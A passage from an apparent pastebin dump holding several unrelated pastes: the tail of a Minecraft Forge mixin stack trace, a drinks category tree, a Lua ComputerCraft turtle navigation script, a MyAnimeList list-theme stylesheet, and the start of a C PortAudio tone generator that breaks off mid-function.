	at org.spongepowered.asm.mixin.transformer.MixinApplicatorStandard.apply(MixinApplicatorStandard.java:325) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.transformer.TargetClassContext.apply(TargetClassContext.java:383) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.transformer.TargetClassContext.applyMixins(TargetClassContext.java:365) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.transformer.MixinProcessor.applyMixins(MixinProcessor.java:363) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.transformer.MixinTransformer.transformClass(MixinTransformer.java:250) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.service.modlauncher.MixinTransformationHandler.processClass(MixinTransformationHandler.java:131) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.launch.MixinLaunchPluginLegacy.processClass(MixinLaunchPluginLegacy.java:131) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at cpw.mods.modlauncher.serviceapi.ILaunchPluginService.processClassWithFlags(ILaunchPluginService.java:156) ~[modlauncher-10.0.9.jar:10.0.9+10.0.9+main.dcd20f30]
	at cpw.mods.modlauncher.LaunchPluginHandler.offerClassNodeToPlugins(LaunchPluginHandler.java:88) ~[modlauncher-10.0.9.jar:?]
	at cpw.mods.modlauncher.ClassTransformer.transform(ClassTransformer.java:120) ~[modlauncher-10.0.9.jar:?]
	at cpw.mods.modlauncher.TransformingClassLoader.maybeTransformClassBytes(TransformingClassLoader.java:50) ~[modlauncher-10.0.9.jar:?]
	at cpw.mods.cl.ModuleClassLoader.readerToClass(ModuleClassLoader.java:113) ~[securejarhandler-2.1.10.jar:?]
	at cpw.mods.cl.ModuleClassLoader.lambda$findClass$15(ModuleClassLoader.java:219) ~[securejarhandler-2.1.10.jar:?]
	at cpw.mods.cl.ModuleClassLoader.loadFromModule(ModuleClassLoader.java:229) ~[securejarhandler-2.1.10.jar:?]
	at cpw.mods.cl.ModuleClassLoader.findClass(ModuleClassLoader.java:219) ~[securejarhandler-2.1.10.jar:?]
	at cpw.mods.cl.ModuleClassLoader.loadClass(ModuleClassLoader.java:135) ~[securejarhandler-2.1.10.jar:?]
	at java.lang.ClassLoader.loadClass(ClassLoader.java:520) ~[?:?]
	at net.minecraft.server.Bootstrap.bootStrap(Bootstrap.java:43) ~[forge-1.20.1-47.0.43_mapped_official_1.20.1-recomp.jar%23195!/:?]
	at net.minecraft.client.main.Main.lambda$main$0(Main.java:151) ~[forge-1.20.1-47.0.43_mapped_official_1.20.1-recomp.jar%23195!/:?]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:539) ~[?:?]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[?:?]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136) ~[?:?]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635) ~[?:?]
	at java.lang.Thread.run(Thread.java:833) ~[?:?]
"
5MwYKFN9,NodesLinks,CR7CR7,Java,Friday 7th of July 2023 05:03:40 AM CDT,"                     Drinks
                     /   \
                   /       \
                 Hot      Cold
                /   \       /             \
              Tea  Coffee Alcoholic           Non-Alcoholic
             / \    /  \    /      /   |        /    /    | 
      Green Black Americano  Wine  Beer Whisky Cola Soda Fanta 
                   Latte
                 Cappuccino
               
        
"
0xaeMvYU,Turtle : move to,seko00,Lua,Friday 7th of July 2023 04:58:21 AM CDT,"function sign(number)
    if number < 0 then
        return -1
    elseif number > 0 then
        return 1
    end
    return 0
end

function orient()
    -- 0:x+ , 1:z+ , 2:x- , 3:z-
    x,y,z = gps.locate()
    while true do
        fuel = turtle.getFuelLevel()
        turtle.forward()
        if fuel == turtle.getFuelLevel() then
            turtle.turnRight()
        else
            xp,yp,zp = gps.locate()
            if x == xp then
                turtle.back()
                return 2 - (zp-z)
            end
            turtle.back()
            return 1 - (xp-x)
        end
    end
end

function moveForward(steps)
    fuel = turtle.getFuelLevel()
    while fuel-turtle.getFuelLevel() < steps do
        turtle.forward()
    end
end

function moveZ(arg_steps)
    fuel = turtle.getFuelLevel()
    steps = arg_steps
    if arg_steps < 0 then
        steps = -arg_steps
    end
    while fuel-turtle.getFuelLevel() < steps do
        if arg_steps < 0 then
            turtle.down()
        else
            turtle.up()
        end
    end
end

function moveDown(steps)
    fuel = turtle.getFuelLevel()
    while fuel-turtle.getFuelLevel() < steps do
        turtle.down()
    end
end

function turn(o, od)
    if math.abs(od - o) == 2 then
        turtle.turnRight()
        turtle.turnRight()
    elseif (o + 1)%4 == od then
        turtle.turnRight()
    elseif (o-1)%4 == od then
        turtle.turnLeft()
    end
    return od
end

function move_to_target(xd,yd,zd)
    orientation = orient()
    x,y,z = gps.locate()
    moveZ(yd-y)
    xo = 1-sign(xd-x)
    zo = 2-sign(zd-z)
    if (xo - orientation)%4 < (zo - orientation)%4 then
        orientation = turn(orientation, xo)
        moveForward(math.abs(xd-x))
        orientation = turn(orientation, zo)
        moveForward(math.abs(zd-z))
    else
        orientation = turn(orientation, zo)
        moveForward(math.abs(zd-z))
        orientation = turn(orientation, xo)
        moveForward(math.abs(xd-x))
    end
end

args = {...}
xd = args[1]
yd = args[2]
zd = args[3]

move_to_target(xd,yd,zd)"
3PWFEmHd,mymal theme by Shishio-kun,argui,CSS,Friday 7th of July 2023 04:57:02 AM CDT,"@\import ""https://dl.dropboxusercontent.com/s/ed2g365i8phd180/aceface.css"";
@\import ""https://malscraper.azurewebsites.net/covers/auto/presets/dataimagelinkafter"";

/* BACKGROUND */

body {
visibility: visible;
background-color: #F1EBDF;
}


/* HEADER */

.header {
visibility: visible;
}

.header .header-menu {
visibility: visible;
background: green;
}

.header .header-title {
visibility: visible;
}

/* SIDE MENU */

.list-menu-float {
visibility: visible;
}

.list-menu-float .icon-menu {
visibility: visible;
}

.list-menu-float .icon-menu.anime-list {
visibility: visible;
}

/* LIST CONTAINER */

#list-container {
visibility: visible;
}

/* IMAGE BLOCK */

.cover-block {
visibility: visible;
}

.cover-block #cover-image {
/* Cover image */
visibility: visible;
}

.cover-block .image-container .btn-list-setting {
visibility: visible;
}

/* STATUS MENU */

#status-menu {
visibility: visible;
}

#status-menu .status-button {
visibility: visible;
}

#status-menu .status-button.watching {
visibility: visible;
}

/* SEARCH */

.status-menu-container .search-container {
visibility: visible;
}

/* LIST UNIT */

.list-unit {
visibility: visible;
}

/* STATUS TITLE */

.list-unit .list-status-title {
visibility: visible;
}

/* STATS */

#show-stats-button {
visibility: visible;
}

#advanced-options-button {
visibility: visible;
}

.list-unit .list-stats {
visibility: visible;
}

/* LIST TABLE */

/* Sort row */

.list-table .list-table-header {
visibility: visible;
}

.list-table .list-table-header .header-title {
visibility: visible;
position: fixed;
left: -10%;
}

.list-table .list-table-header .header-title.title {
visibility: visible;
}

/* Data rows */

.list-table tbody.list-item {
visibility: visible;
}

.list-table .list-table-data .data {
visibility: visible;
}

.list-table .list-table-data .data.score {
visibility: visible;
}

.list-table .list-table-data .data.title .link {
visibility: visible;
}

.add-edit-more {
visibility: visible;
}

/* LOADING SPACE */

.list-unit .loading-space {
visibility: visible;
}

/* FOOTER */

footer {
visibility: visible;
}


/* MORE SEPARATION FOR INSPECT ELEMENT USERS */
.list-table .list-table-header .header-title.image {
visibility: visible;
}

.list-table .list-table-header .header-title.number {
visibility: visible;
}

.list-table .list-table-header .header-title.score {
visibility: visible;
}

.list-table .list-table-header .header-title.type{
visibility: visible;
}

.list-table .list-table-header .header-title.progress{
visibility: visible;
}

.list-table .list-table-header .header-title.tags{
visibility: visible;
}

.list-table .list-table-header .header-title.rated{
visibility: visible;
}

.list-table .list-table-header .header-title.started{
visibility: visible;
}



.list-table .list-table-header .header-title.finished{
visibility: visible;
}


.list-table .list-table-header .header-title.days{
visibility: visible;
}


.list-table .list-table-header .header-title.storage{
visibility: visible;
}


.list-table .list-table-header .header-title.priority{
visibility: visible;
}

.list-table .list-table-data .data.number{
visibility: visible;
}

.list-table .list-table-data .data.title{
visibility: visible;
}

.list-table .list-table-data .data.type{
visibility: visible;
}

.list-table .list-table-data .data.progress{
visibility: visible;
}

.list-table .list-table-data .data.rated{
visibility: visible;
}

.list-table .list-table-data .data.storage{
visibility: visible;
}

.list-table .list-table-data .data.licensor{
visibility: visible;
}

.list-table .list-table-data .data.studio{
visibility: visible;
}

.list-table .list-table-data .data.title.clearfix{
visibility: visible;
}

#status-menu .status-button.completed{
visibility: visible;
position: fixed;
right: 2%;
top: 16%;
background: olive;
width: 20%;
}

#status-menu .status-button.onhold{
visibility: visible;
}

#status-menu .status-button.dropped{
visibility: visible;
}

#status-menu .status-button.plantowatch{
visibility: visible;
}

#status-menu .status-button.all_anime{
visibility: visible;
}

.list-menu-float .icon-menu.profile
{
visibility: visible;
}

.list-menu-float .icon-menu.quick-add {
visibility: visible;
}


.list-menu-float .icon-menu.anime-list {
visibility: visible;
}

.list-menu-float .icon-menu.manga-list{
visibility: visible;
}


.list-menu-float .icon-menu.history{
visibility: visible;
}

.list-menu-float .icon-menu.export{
visibility: visible;
display: none;
}

.list-menu-float .icon-menu.logout{
visibility: visible;
}

.list-menu-float .icon-menu.setting{
visibility: visible;
display: none;
}

.list-menu-float .icon-menu.quick-add {
visibility: visible;
}

.list-table > tbody:nth-of-type(2n+1){
visibility: visible;
}





/* REMOVED CODES */
.list-menu-float .icon-menu.export{
visibility: visible;
display: none;
}

.list-menu-float .icon-menu.logout{
visibility: visible;
}

.list-menu-float .icon-menu.setting{
visibility: visible;
display: none;
}

#status-menu .status-button.all_anime {
visibility: visible;
display: none;
}
.list-menu-float .icon-menu.logout,
.list-menu-float .icon-menu.history,
.list-menu-float .icon-menu.anime-list,
.list-menu-float .icon-menu.manga-list {
visibility: visible;
display: none;
}
.header .header-title{
display: none;
}
.btn-menu {

background: red;
left: -100%;
position: fixed;
}








/* TAGS*/






/* ABOUT ME PANEL */

#advanced-options-button{

visibility: visible;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwIPvn-9Qb7UOlnWUgK8kylY);
background-size: 120%;
background-position: top right;
background-color: transparent;
WIDTH: 24%;
height: 30%;
position: fixed;
left: 34%;
top: 9%;
clip-path: polygon(0 0, 70% 0, 100% 100%, 0% 100%);
border: 3px black solid;
font-size: 0;
}


#advanced-options-button:hover {
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwKr9bGSxcAN7jdlxFAYiGoQ);
WIDTH: 24%;
background-color: transparent;
}



#advanced-options-button:before{
position: fixed;
background-color:transparent;
background-size: 70% !important;
height: 40%;
width: 16%;
right: 55%;
top: 25%;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwOM0HHnoiIcI9auRoz3C1Og);
background-position: top right;
background-repeat: no-repeat;
content: """";
pointer-events: none;
background-size: contain;
z-index: 10;
opacity: 0;}






#advanced-options-button:hover:before{
opacity: 1;}



#advanced-options-button:after
{
position: fixed;
height: 100%;
width: 6px;
right: 39% !important;
top: 0%;
content: """";
display: block;
background-color: black;
transform: rotate(-25deg);
}

#advanced-options .advanced-options-header,
#advanced-options .advanced-options-button,
#advanced-options .filter-widget,
#advanced-options .sort-widget {
display: none;
}


#advanced-options {
border: solid black;
z-index: 10002;
height: 90%;
width: 50%;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwImnURbPVCJV5wTdYoHtuSw);
background-repeat: no-repeat;
background-size: contain;
background-position: bottom center;
}





/* RECOMMENDATION/QUICK ADD PANEL */
.list-menu-float .icon-menu.quick-add {
visibility: visible;
background-image: none;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwPLEaXvNgE7JmyUESgpmIto) !important;
background-size: 100% !important;
background-position: 80% bottom !important;;
background-repeat: no-repeat !important;;
position: fixed;
left: 52%;
top: 9%;
background: orange;
background-color: white;
width: 25%;
height: 30%;
clip-path: polygon(0 0, 100% 0, 100% 100%, 30% 100%);
border: 3px black solid;
font-size: 0;
}

.list-menu-float .icon-menu.quick-add:hover{
background-color: orange;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwIUPag3Jh54BMZkJEYGWzHA) !important;
width: 25%;
height: 30%;
}

.list-menu-float .icon-menu.quick-add:after
{
position: fixed;
height: 100%;
width: 4px;
right: 37.6% !important;
top: 0%;
content: """";
display: block;
background-color: black;
transform: rotate(-25.5deg);
}

.list-unit .list-status-title .stats{
font-size: 0;
}


.list-menu-float .icon-menu:hover .text {
width: 94px;
opacity: 0;
}
.list-menu-float .icon-menu svg.icon {
position: absolute;
fill: #323232;
display: none;
}

#fancybox-outer:before{
content: """";
display: block;
z-index: 100;
position: fixed;
background-repeat: no-repeat;
pointer-events: none;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwNZ9gLKIWmOAfWhUaTGscG4) !important;
background-color: transparent !important;
background-position: bottom right;
background-size: 25%;
height: 100%;
width: 100%;
left: 0 !important;
bottom:0 !important;
padding-top: 30%;
}



/* SCORE ASSISTANT PANEL */

.list-table .list-table-header .header-title.score a {
visibility: visible;
background: white;
position: fixed !important;
height: 50%;
width: 20%;
}
.list-table .list-table-header .header-title.score a {
visibility: visible;
background: white;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwKVbEQEO81cLKyWA9xtBDwI);
background-size: 100%, cover;
background-position: bottom center !important;
background-repeat: no-repeat;
font-size: 0;
position: fixed !important;
bottom: 1%;
right: 7%;
height: 58%;
width: 25%;
border: 3px black solid;

z-index: 1000 !important;
}
.list-table .list-table-header .header-title.score a:after{
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwDTMJQX5sDJg8NTOqE1iIUU);
bottom: 45%;
left: 34.5%;
height: 10%;
width: 24%;
background-color: transparent;
content: """";
position: fixed;
background-size: contain;
background-repeat: no-repeat;
}


.list-table .list-table-header .header-title.score a:hover{
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwKzGtbC7KfWIN2DearwqdbQ);
background-color: rgba(243, 158, 206, 1);
}
.list-table .list-table-header .header-title.score a:before{
position: fixed;
background-color:transparent;
background-size: 100% !important;
height: 40%;
width: 16%;
right: 35%;
bottom: 6%;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwPgEi1I94PJ_EjyzFDdtjtM);
background-position: top right;
background-repeat: no-repeat;
content: """";
pointer-events: none;
background-size: contain;
z-index: 100;
opacity: 0;
}

.list-table .list-table-header .header-title.score a:hover:before{
opacity: 1;
}
.list-table .list-table-header .header-title.score a:hover:after{
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwNJN2lUFF8r9rNsjHD1-vhw);
transform: rotate(-15deg);
margin-left: -50px !important;
background-size: 100%;
width: 26%;
left: 36%;
}




.list-table .list-table-header .header-title.score a {
right: 41%;
}



/* MADOKA/EXIT PANEL */
.list-menu-float .icon-menu.profile {
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwN4iYRxSxh02II8h1UZ_iNE) !important;
background-position: 140% 20%, top left;
background-repeat: no-repeat;
background-size: contain, 150%;
background-color: white;
font-size: 0;
width: 17%;
height: 24%;
position: fixed !important;
right: 23% !important;
bottom: 1% !important;
border: 3px black solid;
z-index: 1 !important;
}

.list-menu-float .icon-menu.profile:hover{
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwHEhRwmkMQzRYZWky0631SI)!important;;
background-color: rgba(171, 158, 220, 1);
}

.list-menu-float .icon-menu.profile:before{
position: fixed;
background-color:transparent;
background-size: contain !important;;
height: 35%;
width: 20%;
right: 20%;
bottom: 0;
background-image: url(https://i.imgur.com/HbFXpz5.png);
background-position: top left;
background-repeat: no-repeat;
content: """";
pointer-events: none;
background-size: contain;
z-index: 10;
opacity: 0;

}

.list-menu-float .icon-menu.profile:hover:before{
opacity: 1;
}

.list-menu-float .icon-menu.profile:after{
position: fixed;
background-color:black;
background-size: contain !important;
height: 2%;
width: 8%;
right: 32.3%;
background-position: top right;
background-repeat: no-repeat;
content: ""The exit appears!"";
font-size: 12px !important;
color: white;
pointer-events: none;
background-size: contain;
z-index: 10;
opacity: 1;

}

.list-menu-float .icon-menu.profile:hover:after{
opacity: 0;
}





/* COPYRIGHT PANEL */
#footer-block {
position: fixed;
margin: auto;
right: 23%;
width: 17%;
bottom: 27%;
height: 29%;
background-color: white !important;

background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwKhtbfX1xxLiqYwy84MbUj0);
background-size: contain, cover;
border: 3px black solid;
z-index: -10;
background-position: center 101%;
background-repeat: no-repeat;
}

#footer-block:hover{
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwINeauqPcArIwhTIondOSKU), url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwHAbi_4WeYoDxRGfXgTlesg);
}
#copyright{
color: black !important;
font-size: 9px;
}
#copyright:after{
content: ""Layout by Shishio-kun, made with Photoshop and JASC Animation Shop.""}


/* STATS */

.header .header-menu .header-info{
background: transparent;
position: fixed;
right: 0%;
text-align: center;
top: 7%;
width: 22%;
z-index: 10001;
color: black;
}

.header a {

font-weight: bold;
color: black;

}






/* RIGHT PANEL WITH CATEGORIES */

#status-menu .status-button.watching {
visibility: visible;
background: transparent;
position: fixed;
right: 2%;
top: 10%;
width: 20%;
height: 10%;
font-size: 0;
z-index: 11111 !important;
}

#status-menu .status-button.watching:after {
visibility: visible;
background-color: transparent;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwPzeHr4HcZycy5dRjvUky7k);
background-position: left top;
background-repeat: no-repeat;
background-size: cover;
position: fixed;
left:0%;
top: 0%;
width: 40%;
height: 100%;
content: """";
opacity: 0;
pointer-events: none;
}

#status-menu .status-button.watching:hover:after {
-webkit-animation-name: slide; /* Safari 4.0 - 8.0 */
-webkit-animation-duration: 1s; /* Safari 4.0 - 8.0 */
animation-name: slide;
animation-duration: 1s;
opacity: 1;
}

@-webkit-keyframes slide {
from {left: -50%}
to { left:0%;}
}

@keyframes slide {
from {left: -50%}
to { left:0%;}
}



#status-menu .status-button.completed {
visibility: visible;
position: fixed;
right: 2%;
top: 23%;
background: transparent;
width: 20%;
height: 10%;
font-size: 0 !important;
color: transparent;
z-index: 100 !important;
}


#status-menu .status-button.completed:after {
visibility: visible;
background-color: transparent;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwJG8sK0TkWHfGlf00V0tKXE);
background-position: left top;
background-repeat: no-repeat;
background-size: cover;
position: fixed;
left:0%;
top: 0%;
width: 40%;
height: 100%;
content: """";
opacity: 0;
font-size: 0;
pointer-events: none;
z-index: 100 !important;}


#status-menu .status-button.completed:hover:after {
-webkit-animation-name: slide; /* Safari 4.0 - 8.0 */
-webkit-animation-duration: 1s; /* Safari 4.0 - 8.0 */
animation-name: slide;
animation-duration: 1s;
opacity: 1;
}


#status-menu .status-button.onhold {
visibility: visible;
position: fixed;
right: 2%;
top: 36%;
background: transparent;
width: 20%;
height: 10%;
font-size: 0;
}
#status-menu .status-button.onhold:after {
visibility: visible;
background-color: transparent;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwPXD-Xd85hU7nKptfnefKV4);
background-position: left top;
background-repeat: no-repeat;
background-size: cover;
position: fixed;
left:0%;
top: 0%;
width: 40%;
height: 100%;
content: """";
opacity: 0;
pointer-events: none;
}

#status-menu .status-button.onhold:hover:after {
-webkit-animation-name: slide; /* Safari 4.0 - 8.0 */
-webkit-animation-duration: 1s; /* Safari 4.0 - 8.0 */
animation-name: slide;
animation-duration: 1s;
opacity: 1;
}



#status-menu .status-button.dropped {
visibility: visible;
position: fixed;
right: 2%;
top: 48%;
background: transparent;
width: 20%;
height: 10%;
font-size: 0;
}
#status-menu .status-button.dropped:after {
visibility: visible;
background-color: transparent;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwHxm_P6-3_0x3Q3QqiRi4lI);
background-position: left top;
background-repeat: no-repeat;
background-size: cover;
position: fixed;
left:0%;
top: 0%;
width: 40%;
height: 100%;
content: """";
opacity: 0;
pointer-events: none;
}

#status-menu .status-button.dropped:hover:after {
-webkit-animation-name: slide; /* Safari 4.0 - 8.0 */
-webkit-animation-duration: 1s; /* Safari 4.0 - 8.0 */
animation-name: slide;
animation-duration: 1s;
opacity: 1;
}


#status-menu .status-button.plantowatch {
visibility: visible;
position: fixed;
right: 2%;
top: 60%;
background: transparent;
width: 20%;
height: 10%;
font-size: 0;
}
#status-menu .status-button.plantowatch:after {
visibility: visible;
background-color: transparent;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwFdtKMt-Vy84PEfz6lsC-ds);
background-position: left top;
background-repeat: no-repeat;
background-size: cover;
position: fixed;
left:0%;
top: 0%;
width: 40%;
height: 100%;
content: """";
opacity: 0;
pointer-events: none;
}

#status-menu .status-button.plantowatch:hover:after {
-webkit-animation-name: slide; /* Safari 4.0 - 8.0 */
-webkit-animation-duration: 1s; /* Safari 4.0 - 8.0 */
animation-name: slide;
animation-duration: 1s;
opacity: 1;
}

.status-menu-container .search-container {
visibility: visible;
position: fixed;
background: red;
bottom: 10%;
right: 0;
width: 10%;
}

.status-menu-container .search-container {
visibility: visible;
position: fixed;
background: transparent;
bottom: 1%;
right: 12%;
}

.status-menu-container {
position: fixed;
background-color: white;
height: 89.5%;
width: 21%;
right: 1%;
bottom: 1%;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwEKju5WNWzoHVs9aANc-ZoY);
background-position: 100% 180%;
background-repeat: no-repeat;
border: 3px black solid;
}

.status-menu-container:hover{
background-color: rgb(199,239,241);
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwMY6dBoE7GCM_KrUv8ihQoA);

}

.status-menu-container:After{
position: fixed;
background-color: transparent;
height: 90%;
width: 21%;
right: 1%;
bottom: 8%;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwGMI6NgUR17-0F41q3Jd9AM);
background-position: bottom right;
background-repeat: no-repeat;
content: """";
pointer-events: none;
background-size: contain;
}


.status-menu-container:before{
position: fixed;
background-color: transparent;
height: 100%;
width: 21%;
right: 16%;
bottom: 18%;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwPLNy0_k96Vby79bSkVZ1PE);
background-position: bottom right;
background-repeat: no-repeat;
content: """";
pointer-events: none;
background-size: contain;
z-index: 10;
opacity: 0;

}

.status-menu-container:hover:before{
-webkit-animation-name: A1; /* Safari 4.0 - 8.0 */
-webkit-animation-duration: 10s; /* Safari 4.0 - 8.0 */
animation-name: A1;
animation-duration: 10s;}


@-webkit-keyframes A1 {
0% {opacity: 0}
24% {opacity: 0;}
25% {opacity: 1;}
99% {opacity: 1}
100% {opacity: 0;}
}

.status-menu-container .status-menu .status-button::after {
background-color: transparent;}

.status-menu-container.fixed {
position: fixed !important;
top: 9%;
bottom: 1% !important;
}




/* HEADING */
body[data-query*='""status"":1']:before
{
background-color: #F1EBDF;
height: 6%;
padding-top: 1%;
content: ""Here is Shishio's current anime, you stalker."";
font-size: 36px;
color: black;
position: fixed;
left: 0% !important;
top: 0%;
width: 100%;
text-align: center;
pointer-events: none;
display: block;
z-index: 1 !important;
}

body[data-query*='""status"":2']:before
{
background-color: #F1EBDF;
height: 7%;
padding-top: 1%;
content: ""This long list is Shishio's Completed Anime! It's ok to feel impressed and turned on, that's natural."";
font-size: 25px;
color: black;
position: fixed;
left: 0% !important;
top: 0%;
width: 100%;
text-align: center;
pointer-events: none;
display: block;
z-index: 1 !important;
}

body[data-query*='""status"":3']:before
{
content: ""Shishio's On-hold anime, but it might as well be dropped since he never goes back to these."";
background-color: #F1EBDF;
height: 6%;
padding-top: 1%;
font-size: 26px;
color: black;
position: fixed;
left: 0% !important;
top: 0%;
width: 100%;
text-align: center;
pointer-events: none;
display: block;

z-index: 1 !important;
}

body[data-query*='""status"":4']:before
{
content: ""Dropped anime, the worst of the worst! Prepare to be offended by our comments!"";
background-color: #F1EBDF;
height: 6%;
padding-top: 1%;
font-size: 25px;
color: black;
position: fixed;
left: 0% !important;
top: 0%;
width: 100%;
text-align: center;
pointer-events: none;
display: block;

z-index: 1 !important;
}

body[data-query*='""status"":6']:before
{
content: ""Planned anime AKA seems-good-but-not-good-enough-to-start-right-away anime."";
background-color: #F1EBDF;
height: 6%;
padding-top: 1%;
font-size: 25px;
color: black;
position: fixed;
left: 0% !important;
top: 0%;
width: 100%;
text-align: center;
pointer-events: none;
display: block;
z-index: 1 !important;
}





/* FONT */

*{ font-family: ace, fontawesome !important;}






/* LIST LEFT TABLE SETTINGS */

/* COVER SIZE */
.data.image a:after{
width: 200px;
height: 300px;
}


/* COVER POSITION */
.data.image a:after{
position: fixed;
right: 0;
left: -40px;
top: 25%;
margin: auto;

}


/* OTHER CODES */
.data.image a:after
{content: """";
display: block !important;
background-color: rgba(0,0,0,.3);
background-position: center !important;
background-repeat: no-repeat !important;
background-size: cover;
border: 1px solid #ffffff;
box-shadow: 0 2px 5px rgba(0,0,0, 0.7);
visibility: hidden;
opacity: 1;
pointer-events: none !important;;
transition: opacity .8s linear, margin-left .5s ease, transform 1s ease-in-out;
z-index: 5;}


.list-table .list-table-data:hover .data.image a:after {
visibility: visible;

pointer-events: none !important;;
opacity: 1;
transition: .3s ease-out;}


/* review section */

.list-table .list-table-data .data.tags {
position: fixed;
right: 0;
left: 0;
top: 50%;
margin: auto;
background-image: url(https://image.myanimelist.net/ui/5LYzTBVoS196gvYvw3zjwAmmNei3ftWHltBOI97xl-A);
display: inline !important;
line-height: 20px !important;
text-align:center;
pointer-events: none !important;
z-index: 6;
background-size: contain;
padding: 120px !important;
padding-top: 155px !important;;
height:450px;
width: 550px;
background-repeat: no-repeat;
background-color: transparent;
background-size: contain;
opacity: 0;
font-size: 18px;
}



.list-table .list-table-data .data.tags *
{
animation-name: pop;
animation-duration: 1s;
pointer-events: none !important;
color: black !important;}


.list-table .list-table-data:hover .data.tags, .list-table .list-table-data:hover .data.tags span:after {
opacity: 1;
animation-name: pop;
animation-duration: 1s;
pointer-events: none !important;
}

@keyframes pop {
0% { height:450px;
width: 550px;
font-size: 0px;}
12% { height:800px;
width: 800px;
font-size: 0px;}
26% { height:450px;
width: 550px;
font-size: 0px;
}
27% { height:450px;
width: 550px;
font-size: 18px;
}
100% { height:450px;
width: 550px;
font-size: 18px;}
}



.list-container {
position: absolute;
left: -5%;
filter: grayscale !important;
}

.list-table .list-table-header .header-title {
visibility: visible;
position: fixed;
left: -10%;
}

.list-table {
border-collapse: collapse;
width: 70%;

}
#list-container {
visibility: visible;
overflow: auto;
height: 96%;
width: 46%;
}

.list-menu-float {
border: 0;
}

.list-table {
width: 55%;
position: relative;
left: -20%;
}




.list-unit .list-status-title{
background-color: transparent;
position: fixed;
top: 0;
font-size: 0;
}



.list-table > tbody:nth-of-type(2n+1){
background: white;
}

.list-table .list-table-data .data{
border: none;
}


#list-container {
border: 3px black solid;
width: 32%;
top: 9%;
left: 1%;
height: 100%;
background: white;
}



.list-unit .list-status-title .text {
pointer-events: none;
}


#advanced-options {
z-index: 10002;

}

.list-unit {
width: 931px;

}


.list-table .list-table-data .data {
-webkit-filter: grayscale(100%); /* Safari 6.0 - 9.0 */
filter: grayscale(100%);
}



.list-table-data:hover td
{
-webkit-filter:inherit !important;;
filter: inherit !important;
background-color: whitesmoke;
}"
hfdkNaGJ,ukaelToneC.h,Kaelygon,C,Friday 7th of July 2023 04:56:55 AM CDT,"
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include ""portaudio.h""


//typedef
//fraction (a, b)
typedef struct {
	uint16_t a;
	uint16_t b;
} Frac;

//(data*, size, position)
typedef struct {
	const uint8_t* data;  // Pointer to the raw audio data
	size_t size;      // Size of the audio data in bytes
	size_t position;      // Current position in the audio data
} AudioData;


//Input Output

void writeAudioDataToFile(const char* filename, const AudioData* audio) {
	// Open the file in binary mode for writing
	FILE* file = fopen(filename, ""wb"");
	if (file == NULL) {
		fprintf(stderr, ""Failed to open the file for writing.\n"");
		return;
	}

	// Write the audio data to the file
	size_t bytesWritten = fwrite(audio->data, sizeof(uint8_t), audio->size, file);
	if (bytesWritten != audio->size) {
		fprintf(stderr, ""Failed to write the audio data to the file.\n"");
	}

	// Close the file
	fclose(file);
}


//Tone generation
// Callback function that is called by PortAudio to fill the output buffer
static int audioCallback(
	const void* inputBuffer, 
	void* outputBuffer,
	unsigned long framesPerBuffer,
	const PaStreamCallbackTimeInfo* timeInfo,
	PaStreamCallbackFlags statusFlags, 
	void* userData
){
	AudioData* audioData = (AudioData*)userData;
	uint8_t* out = (uint8_t*)outputBuffer;
	size_t remainingData = audioData->size - audioData->position;
	size_t numFrames = framesPerBuffer;
	
	// If there is not enough audio data remaining, fill the buffer with silence
	if (remainingData < framesPerBuffer) {
		numFrames = remainingData;
		for (size_t i = 0; i < numFrames; i++) {
